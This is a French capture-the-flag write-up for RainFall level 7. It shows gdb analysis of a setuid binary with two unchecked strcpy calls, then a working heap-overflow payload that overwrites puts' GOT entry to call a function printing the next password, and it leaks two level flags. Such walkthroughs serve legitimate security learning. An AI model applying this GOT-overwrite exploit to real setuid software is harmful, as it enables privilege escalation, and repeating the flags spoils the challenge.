# LEVEL 7

### Reconnaissance

On se connecte au level7 avec le password : f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d

On trouve un binaire 

```
  GCC stack protector support:            Enabled
  Strict user copy checks:                Disabled
  Restrict /dev/mem access:               Enabled
  Restrict /dev/kmem access:              Enabled
  grsecurity / PaX: No GRKERNSEC
  Kernel Heap Hardening: No KERNHEAP
 System-wide ASLR (kernel.randomize_va_space): Off (Setting: 0)
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/level7/level7
level7@RainFall:~$ ls
level7
level7@RainFall:~$ file level7 
level7: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0xaee40d38d396a2ba3356a99de2d8afc4874319e2, not stripped
level7@RainFall:~$ ./level7 
Segmentation fault (core dumped)
level7@RainFall:~$ ./level7 aaaaaaaaaaaaaaaaaaaaa
Segmentation fault (core dumped)
level7@RainFall:~$ ./level7 aaa aaa
~~
level7@RainFall:~$ ./level7 aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa aaaaaaaaaaaaaaaaaaa
Segmentation fault (core dumped)
```

On le télécharge et on l'analysera avec r2 et gdb.

J'ai creer un fichier ```/home/user/level8/.pass``` afin de ne pas avoir l'erreur quand le programme fait le fopen()

Le main du programme:
```
gdb-peda$ disas main
Dump of assembler code for function main:
   0x08048521 <+0>:     push   ebp
   0x08048522 <+1>:     mov    ebp,esp
   0x08048524 <+3>:     and    esp,0xfffffff0
   0x08048527 <+6>:     sub    esp,0x20
   0x0804852a <+9>:     mov    DWORD PTR [esp],0x8
   0x08048531 <+16>:    call   0x80483f0 <malloc@plt>
   0x08048536 <+21>:    mov    DWORD PTR [esp+0x1c],eax
   0x0804853a <+25>:    mov    eax,DWORD PTR [esp+0x1c]
   0x0804853e <+29>:    mov    DWORD PTR [eax],0x1
   0x08048544 <+35>:    mov    DWORD PTR [esp],0x8
   0x0804854b <+42>:    call   0x80483f0 <malloc@plt>
   0x08048550 <+47>:    mov    edx,eax
   0x08048552 <+49>:    mov    eax,DWORD PTR [esp+0x1c]
   0x08048556 <+53>:    mov    DWORD PTR [eax+0x4],edx
   0x08048559 <+56>:    mov    DWORD PTR [esp],0x8
   0x08048560 <+63>:    call   0x80483f0 <malloc@plt>
   0x08048565 <+68>:    mov    DWORD PTR [esp+0x18],eax
   0x08048569 <+72>:    mov    eax,DWORD PTR [esp+0x18]
   0x0804856d <+76>:    mov    DWORD PTR [eax],0x2
   0x08048573 <+82>:    mov    DWORD PTR [esp],0x8
   0x0804857a <+89>:    call   0x80483f0 <malloc@plt>
   0x0804857f <+94>:    mov    edx,eax
   0x08048581 <+96>:    mov    eax,DWORD PTR [esp+0x18]
   0x08048585 <+100>:   mov    DWORD PTR [eax+0x4],edx
   0x08048588 <+103>:   mov    eax,DWORD PTR [ebp+0xc]
   0x0804858b <+106>:   add    eax,0x4
   0x0804858e <+109>:   mov    eax,DWORD PTR [eax]
   0x08048590 <+111>:   mov    edx,eax
   0x08048592 <+113>:   mov    eax,DWORD PTR [esp+0x1c]
   0x08048596 <+117>:   mov    eax,DWORD PTR [eax+0x4]
   0x08048599 <+120>:   mov    DWORD PTR [esp+0x4],edx
   0x0804859d <+124>:   mov    DWORD PTR [esp],eax
   0x080485a0 <+127>:   call   0x80483e0 <strcpy@plt>
   0x080485a5 <+132>:   mov    eax,DWORD PTR [ebp+0xc]
   0x080485a8 <+135>:   add    eax,0x8
   0x080485ab <+138>:   mov    eax,DWORD PTR [eax]
   0x080485ad <+140>:   mov    edx,eax
   0x080485af <+142>:   mov    eax,DWORD PTR [esp+0x18]
   0x080485b3 <+146>:   mov    eax,DWORD PTR [eax+0x4]
   0x080485b6 <+149>:   mov    DWORD PTR [esp+0x4],edx
   0x080485ba <+153>:   mov    DWORD PTR [esp],eax
   0x080485bd <+156>:   call   0x80483e0 <strcpy@plt>
   0x080485c2 <+161>:   mov    edx,0x80486e9
   0x080485c7 <+166>:   mov    eax,0x80486eb
   0x080485cc <+171>:   mov    DWORD PTR [esp+0x4],edx
   0x080485d0 <+175>:   mov    DWORD PTR [esp],eax
   0x080485d3 <+178>:   call   0x8048430 <fopen@plt>
   0x080485d8 <+183>:   mov    DWORD PTR [esp+0x8],eax
   0x080485dc <+187>:   mov    DWORD PTR [esp+0x4],0x44
   0x080485e4 <+195>:   mov    DWORD PTR [esp],0x8049960
   0x080485eb <+202>:   call   0x80483c0 <fgets@plt>
   0x080485f0 <+207>:   mov    DWORD PTR [esp],0x8048703
   0x080485f7 <+214>:   call   0x8048400 <puts@plt>
   0x080485fc <+219>:   mov    eax,0x0
   0x08048601 <+224>:   leave  
   0x08048602 <+225>:   ret    
End of assembler dump.
```

On a 2 strcpy qui sont fait, sans protection ce qui fait que le programme est vulnérable au BOF.

Après plusieurs test, on trouve la longueur du premier buffer:

Le breakpoint est mis au niveau du 2eme strcpy.
```
gdb-peda$ b*0x080485bd
Breakpoint 1 at 0x80485bd
```

- Comportement "Normal"
```
gdb-peda$ r $(python -c 'print "A" * 16 + "BBBB"')  $(python -c 'print "CCCC" * 1')
Starting program: /home/yoginet/Documents/101/rainfall/level7/level_7 $(python -c 'print "A" * 16 + "BBBB"')  $(python -c 'print "CCCC" * 1')
[----------------------------------registers-----------------------------------]
EAX: 0x804a100 --> 0x0 
EBX: 0x0 
ECX: 0xffffd430 ("AAABBBB")
EDX: 0xffffd438 ("CCCC")
ESI: 0xf7fae000 --> 0x1e4d6c 
EDI: 0xf7fae000 --> 0x1e4d6c 
EBP: 0xffffd188 --> 0x0 
ESP: 0xffffd160 --> 0x804a100 --> 0x0 
EIP: 0x80485bd (<main+156>:     call   0x80483e0 <strcpy@plt>)
EFLAGS: 0x286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x80485b3 <main+146>:        mov    eax,DWORD PTR [eax+0x4]
   0x80485b6 <main+149>:        mov    DWORD PTR [esp+0x4],edx
   0x80485ba <main+153>:        mov    DWORD PTR [esp],eax
=> 0x80485bd <main+156>:        call   0x80483e0 <strcpy@plt>
   0x80485c2 <main+161>:        mov    edx,0x80486e9
   0x80485c7 <main+166>:        mov    eax,0x80486eb
   0x80485cc <main+171>:        mov    DWORD PTR [esp+0x4],edx
   0x80485d0 <main+175>:        mov    DWORD PTR [esp],eax
Guessed arguments:
arg[0]: 0x804a100 --> 0x0 
arg[1]: 0xffffd438 ("CCCC")
[------------------------------------stack-------------------------------------]
0000| 0xffffd160 --> 0x804a100 --> 0x0 
0004| 0xffffd164 --> 0xffffd438 ("CCCC")
0008| 0xffffd168 --> 0xf7fae000 --> 0x1e4d6c 
0012| 0xffffd16c --> 0xf7e00be5 (<__cxa_atexit+37>:     add    esp,0x1c)
0016| 0xffffd170 --> 0xf7fe4080 (push   ebp)
0020| 0xffffd174 --> 0x0 
0024| 0xffffd178 --> 0x804a1c0 ("BBBB")
0028| 0xffffd17c --> 0x804a1a0 --> 0x1 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 9, 0x080485bd in main ()
gdb-peda$ ni
[----------------------------------registers-----------------------------------]
EAX: 0x804a100 ("CCCC")
EBX: 0x0 
ECX: 0xffffd438 ("CCCC")
EDX: 0x804a100 ("CCCC")
ESI: 0xf7fae000 --> 0x1e4d6c 
EDI: 0xf7fae000 --> 0x1e4d6c 
EBP: 0xffffd188 --> 0x0 
ESP: 0xffffd160 --> 0x804a100 ("CCCC")
EIP: 0x80485c2 (<main+161>:     mov    edx,0x80486e9)
EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x80485b6 <main+149>:        mov    DWORD PTR [esp+0x4],edx
   0x80485ba <main+153>:        mov    DWORD PTR [esp],eax
   0x80485bd <main+156>:        call   0x80483e0 <strcpy@plt>
=> 0x80485c2 <main+161>:        mov    edx,0x80486e9
   0x80485c7 <main+166>:        mov    eax,0x80486eb
   0x80485cc <main+171>:        mov    DWORD PTR [esp+0x4],edx
   0x80485d0 <main+175>:        mov    DWORD PTR [esp],eax
   0x80485d3 <main+178>:        call   0x8048430 <fopen@plt>
[------------------------------------stack-------------------------------------]
0000| 0xffffd160 --> 0x804a100 ("CCCC")
0004| 0xffffd164 --> 0xffffd438 ("CCCC")
0008| 0xffffd168 --> 0xf7fae000 --> 0x1e4d6c 
0012| 0xffffd16c --> 0xf7e00be5 (<__cxa_atexit+37>:     add    esp,0x1c)
0016| 0xffffd170 --> 0xf7fe4080 (push   ebp)
0020| 0xffffd174 --> 0x0 
0024| 0xffffd178 --> 0x804a1c0 ("BBBB")
0028| 0xffffd17c --> 0x804a1a0 --> 0x1 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x080485c2 in main ()
gdb-peda$ c
Continuing.
~~
[Inferior 1 (process 7262) exited normally]
```

- Lorsqu'on Segfault:
```
gdb-peda$ r $(python -c 'print "A" * 20 + "BBBB"')  $(python -c 'print "CCCC" * 1')
Starting program: /home/yoginet/Documents/101/rainfall/level7/level_7 $(python -c 'print "A" * 20 + "BBBB"')  $(python -c 'print "CCCC" * 1')
[----------------------------------registers-----------------------------------]
EAX: 0x42424242 ('BBBB')
EBX: 0x0 
ECX: 0xffffd430 ("AAABBBB")
EDX: 0xffffd438 ("CCCC")
ESI: 0xf7fae000 --> 0x1e4d6c 
EDI: 0xf7fae000 --> 0x1e4d6c 
EBP: 0xffffd188 --> 0x0 
ESP: 0xffffd160 ("BBBB8\324\377\377")
EIP: 0x80485bd (<main+156>:     call   0x80483e0 <strcpy@plt>)
EFLAGS: 0x286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x80485b3 <main+146>:        mov    eax,DWORD PTR [eax+0x4]
   0x80485b6 <main+149>:        mov    DWORD PTR [esp+0x4],edx
   0x80485ba <main+153>:        mov    DWORD PTR [esp],eax
=> 0x80485bd <main+156>:        call   0x80483e0 <strcpy@plt>
   0x80485c2 <main+161>:        mov    edx,0x80486e9
   0x80485c7 <main+166>:        mov    eax,0x80486eb
   0x80485cc <main+171>:        mov    DWORD PTR [esp+0x4],edx
   0x80485d0 <main+175>:        mov    DWORD PTR [esp],eax
Guessed arguments:
arg[0]: 0x42424242 ('BBBB')
arg[1]: 0xffffd438 ("CCCC")
[------------------------------------stack-------------------------------------]
0000| 0xffffd160 ("BBBB8\324\377\377")
0004| 0xffffd164 --> 0xffffd438 ("CCCC")
0008| 0xffffd168 --> 0xf7fae000 --> 0x1e4d6c 
0012| 0xffffd16c --> 0xf7e00be5 (<__cxa_atexit+37>:     add    esp,0x1c)
0016| 0xffffd170 --> 0xf7fe4080 (push   ebp)
0020| 0xffffd174 --> 0x0 
0024| 0xffffd178 --> 0x804a1c0 ("AAAABBBB")
0028| 0xffffd17c --> 0x804a1a0 --> 0x1 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 9, 0x080485bd in main ()
gdb-peda$ ni

Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
EAX: 0x43434343 ('CCCC')
EBX: 0x0 
ECX: 0xffffd438 ("CCCC")
EDX: 0x42424242 ('BBBB')
ESI: 0xf7fae000 --> 0x1e4d6c 
EDI: 0xf7fae000 --> 0x1e4d6c 
EBP: 0xffffd188 --> 0x0 
ESP: 0xffffd15c --> 0x80485c2 (<main+161>:      mov    edx,0x80486e9)
EIP: 0xf7e62222 (mov    DWORD PTR [edx],eax)
EFLAGS: 0x10246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0xf7e62217:  lea    esi,[esi+eiz*1+0x0]
   0xf7e6221e:  xchg   ax,ax
   0xf7e62220:  mov    eax,DWORD PTR [ecx]
=> 0xf7e62222:  mov    DWORD PTR [edx],eax
   0xf7e62224:  mov    al,BYTE PTR [ecx+0x4]
   0xf7e62227:  mov    BYTE PTR [edx+0x4],al
   0xf7e6222a:  mov    eax,edx
   0xf7e6222c:  ret
[------------------------------------stack-------------------------------------]
0000| 0xffffd15c --> 0x80485c2 (<main+161>:     mov    edx,0x80486e9)
0004| 0xffffd160 ("BBBB8\324\377\377")
0008| 0xffffd164 --> 0xffffd438 ("CCCC")
0012| 0xffffd168 --> 0xf7fae000 --> 0x1e4d6c 
0016| 0xffffd16c --> 0xf7e00be5 (<__cxa_atexit+37>:     add    esp,0x1c)
0020| 0xffffd170 --> 0xf7fe4080 (push   ebp)
0024| 0xffffd174 --> 0x0 
0028| 0xffffd178 --> 0x804a1c0 ("AAAABBBB")
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0xf7e62222 in ?? () from /lib32/libc.so.6
```

- Pourquoi le Segfault ?

Lors de l'appel a strcpy, on peux remarquer ces différences :
```
Guessed arguments:
arg[0]: 0x804a100 --> 0x0 
arg[1]: 0xffffd438 ("CCCC")

Guessed arguments:
arg[0]: 0x42424242 ('BBBB')
arg[1]: 0xffffd438 ("CCCC")
```

On ecrase l'adresse de ```arg[0]``` donc on segfault, par contre ce n'est pas cette adresse qui nous est renvoyé:
```
Stopped reason: SIGSEGV
0xf7e62222 in ?? () from /lib32/libc.so.6
```

- Pourquoi ?

Si on regarde avec gdb:
```
gdb-peda$ x/i 0xf7e62222
   0xf7e62222:  mov    DWORD PTR [edx],eax
```

Comme l'erreur c'est produite au niveau du strcpy, il nous renvoie une adresse de la libc. On peux le vérifier de cette manière:
```
gdb-peda$ vmmap
Start      End        Perm      Name
[...]
0xf7dc9000 0xf7fab000 r-xp      /usr/lib32/libc-2.31.so
[...]
```

Donc maintenant on sait que l'on peux écrasé l'addresse ```arg[0]``` du 2eme strcpy.

On a une autre fonction dans le programme:
```
$ nm level7 | grep T
[...]
080484f4 T m
08048521 T main
[...]
```

Pour avoir son adresse:
```
(gdb) disas m
Dump of assembler code for function m:
   0x080484f4 <+0>:     push   %ebp
   0x080484f5 <+1>:     mov    %esp,%ebp
   0x080484f7 <+3>:     sub    $0x18,%esp
   0x080484fa <+6>:     movl   $0x0,(%esp)
   0x08048501 <+13>:    call   0x80483d0 <time@plt>
   0x08048506 <+18>:    mov    $0x80486e0,%edx
   0x0804850b <+23>:    mov    %eax,0x8(%esp)
   0x0804850f <+27>:    movl   $0x8049960,0x4(%esp)
   0x08048517 <+35>:    mov    %edx,(%esp)
   0x0804851a <+38>:    call   0x80483b0 <printf@plt>
   0x0804851f <+43>:    leave  
   0x08048520 <+44>:    ret    
End of assembler dump.
```
Nous avons l'adresse de cette fonction (0x080484f4). C'est parfait elle affiche le contenu du .pass. Nous n'avons pas de shellcode a créer.

### Exploitation

Maintenant qu'on a les différentes addresses qui nous interesse, comment procédé pour que sa fonctionne ?

Rappel sur la base de notre payload:
```
./level7 $(python -c 'print "A" * 20 + "<INPUT1>"') $(python -c 'print "<INPUT2>"')
```

-> INPUT1 correspond au premier paramètre du 2eme strcpy.

-> INPUT2 correspond a la valeur pointer par cette adresse


L'idée est de réussir a appeler la fonction m (0x080484f4):
```
>>> p32(0x080484f4)
'\xf4\x84\x04\x08'
```

Et si on remplacait l'adresse de puts ? (Overwriting a function pointer).

On va chercher son adresse:
```
level7@RainFall:~$ objdump -d level7
[...]
08048400 <puts@plt>:
 8048400:       ff 25 28 99 04 08       jmp    *0x8049928
 8048406:       68 28 00 00 00          push   $0x28
 804840b:       e9 90 ff ff ff          jmp    80483a0 <_init+0x34>
[...]
```

On la convertie:
```
>>> p32(0x8049928)
'(\x99\x04\x08'
```

On lance notre payload:
```
level7@RainFall:~$ ./level7 $(python -c 'print "A" * 20 + "(\x99\x04\x08"') $(python -c 'print "\xf4\x84\x04\x08"')
5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
 - 1599663587
```
**Sa marche !**

- Voyons voir ce qu'il c'est passé:

Si on break au 2eme strcpy:
```
gdb-peda$ ni
[----------------------------------registers-----------------------------------]
EAX: 0x8049928 --> 0x8048406 (<puts@plt+6>:     push   0x28)
EBX: 0x0 
ECX: 0xffffd430 ("AAA(\231\004\b")
EDX: 0xffffd438 --> 0x80484f4 (<m>:     push   ebp)
ESI: 0xf7fae000 --> 0x1e4d6c 
EDI: 0xf7fae000 --> 0x1e4d6c 
EBP: 0xffffd188 --> 0x0 
ESP: 0xffffd160 --> 0x8049928 --> 0x8048406 (<puts@plt+6>:      push   0x28)
EIP: 0x80485bd (<main+156>:     call   0x80483e0 <strcpy@plt>)
EFLAGS: 0x286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x80485b3 <main+146>:        mov    eax,DWORD PTR [eax+0x4]
   0x80485b6 <main+149>:        mov    DWORD PTR [esp+0x4],edx
   0x80485ba <main+153>:        mov    DWORD PTR [esp],eax
=> 0x80485bd <main+156>:        call   0x80483e0 <strcpy@plt>
   0x80485c2 <main+161>:        mov    edx,0x80486e9
   0x80485c7 <main+166>:        mov    eax,0x80486eb
   0x80485cc <main+171>:        mov    DWORD PTR [esp+0x4],edx
   0x80485d0 <main+175>:        mov    DWORD PTR [esp],eax
Guessed arguments:
arg[0]: 0x8049928 --> 0x8048406 (<puts@plt+6>:  push   0x28)
arg[1]: 0xffffd438 --> 0x80484f4 (<m>:  push   ebp)
[------------------------------------stack-------------------------------------]
0000| 0xffffd160 --> 0x8049928 --> 0x8048406 (<puts@plt+6>:     push   0x28)
0004| 0xffffd164 --> 0xffffd438 --> 0x80484f4 (<m>:     push   ebp)
0008| 0xffffd168 --> 0xf7fae000 --> 0x1e4d6c 
0012| 0xffffd16c --> 0xf7e00be5 (<__cxa_atexit+37>:     add    esp,0x1c)
0016| 0xffffd170 --> 0xf7fe4080 (push   ebp)
0020| 0xffffd174 --> 0x0 
0024| 0xffffd178 --> 0x804a1c0 ("AAAA(\231\004\b")
0028| 0xffffd17c --> 0x804a1a0 --> 0x1 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x080485bd in main ()
```

Voici les arguments de strcpy:
```
Guessed arguments:
arg[0]: 0x8049928 --> 0x8048406 (<puts@plt+6>:  push   0x28)
arg[1]: 0xffffd438 --> 0x80484f4 (<m>:  push   ebp)
```

Et on break juste apres puts (0x8048400):

Avec notre payload:
```
gdb-peda$ ni
[----------------------------------registers-----------------------------------]
EAX: 0x8049960 ("password.pass\n")
EBX: 0x0 
ECX: 0x804a32e --> 0x0 
EDX: 0xfbad2488 
ESI: 0xf7fae000 --> 0x1e4d6c 
EDI: 0xf7fae000 --> 0x1e4d6c 
EBP: 0xffffd188 --> 0x0 
ESP: 0xffffd15c --> 0x80485fc (<main+219>:      mov    eax,0x0)
EIP: 0x8048400 (<puts@plt>:     jmp    DWORD PTR ds:0x8049928)
EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x80483f0 <malloc@plt>:      jmp    DWORD PTR ds:0x8049924
   0x80483f6 <malloc@plt+6>:    push   0x20
   0x80483fb <malloc@plt+11>:   jmp    0x80483a0
=> 0x8048400 <puts@plt>:        jmp    DWORD PTR ds:0x8049928
 | 0x8048406 <puts@plt+6>:      push   0x28
 | 0x804840b <puts@plt+11>:     jmp    0x80483a0
 | 0x8048410 <__gmon_start__@plt>:      jmp    DWORD PTR ds:0x804992c
 | 0x8048416 <__gmon_start__@plt+6>:    push   0x30
 |->   0x80484f4 <m>:   push   ebp
       0x80484f5 <m+1>: mov    ebp,esp
       0x80484f7 <m+3>: sub    esp,0x18
       0x80484fa <m+6>: mov    DWORD PTR [esp],0x0
                                                                  JUMP is taken
[------------------------------------stack-------------------------------------]
0000| 0xffffd15c --> 0x80485fc (<main+219>:     mov    eax,0x0)
0004| 0xffffd160 --> 0x8048703 --> 0x7e7e ('~~')
0008| 0xffffd164 --> 0x44 ('D')
0012| 0xffffd168 --> 0x804a1e0 --> 0xfbad2488 
0016| 0xffffd16c --> 0xf7e00be5 (<__cxa_atexit+37>:     add    esp,0x1c)
0020| 0xffffd170 --> 0xf7fe4080 (push   ebp)
0024| 0xffffd174 --> 0x0 
0028| 0xffffd178 --> 0x804a1c0 ("AAAA(\231\004\b")
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 4, 0x08048400 in puts@plt ()
```

Avec une valeur standard:
```
// gdb-peda$ r aaa aaa
gdb-peda$ ni
[----------------------------------registers-----------------------------------]
EAX: 0x8049960 ("password.pass\n")
EBX: 0x0 
ECX: 0x804a32e --> 0x0 
EDX: 0xfbad2488 
ESI: 0xf7fae000 --> 0x1e4d6c 
EDI: 0xf7fae000 --> 0x1e4d6c 
EBP: 0xffffd1c8 --> 0x0 
ESP: 0xffffd19c --> 0x80485fc (<main+219>:      mov    eax,0x0)
EIP: 0x8048400 (<puts@plt>:     jmp    DWORD PTR ds:0x8049928)
EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x80483f0 <malloc@plt>:      jmp    DWORD PTR ds:0x8049924
   0x80483f6 <malloc@plt+6>:    push   0x20
   0x80483fb <malloc@plt+11>:   jmp    0x80483a0
=> 0x8048400 <puts@plt>:        jmp    DWORD PTR ds:0x8049928
 | 0x8048406 <puts@plt+6>:      push   0x28
 | 0x804840b <puts@plt+11>:     jmp    0x80483a0
 | 0x8048410 <__gmon_start__@plt>:      jmp    DWORD PTR ds:0x804992c
 | 0x8048416 <__gmon_start__@plt+6>:    push   0x30
 |->   0x8048406 <puts@plt+6>:  push   0x28
       0x804840b <puts@plt+11>: jmp    0x80483a0
       0x8048410 <__gmon_start__@plt>:  jmp    DWORD PTR ds:0x804992c
       0x8048416 <__gmon_start__@plt+6>:        push   0x30
                                                                  JUMP is taken
[------------------------------------stack-------------------------------------]
0000| 0xffffd19c --> 0x80485fc (<main+219>:     mov    eax,0x0)
0004| 0xffffd1a0 --> 0x8048703 --> 0x7e7e ('~~')
0008| 0xffffd1a4 --> 0x44 ('D')
0012| 0xffffd1a8 --> 0x804a1e0 --> 0xfbad2488 
0016| 0xffffd1ac --> 0xf7e00be5 (<__cxa_atexit+37>:     add    esp,0x1c)
0020| 0xffffd1b0 --> 0xf7fe4080 (push   ebp)
0024| 0xffffd1b4 --> 0x0 
0028| 0xffffd1b8 --> 0x804a1c0 --> 0x2 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 1, 0x08048400 in puts@plt ()
```

En faite nous avons pu ecrire l'adresse de m (0x80484f4) a la place de 0x8048406 et donc modifier le déroulement du programme.

Enjoy :)
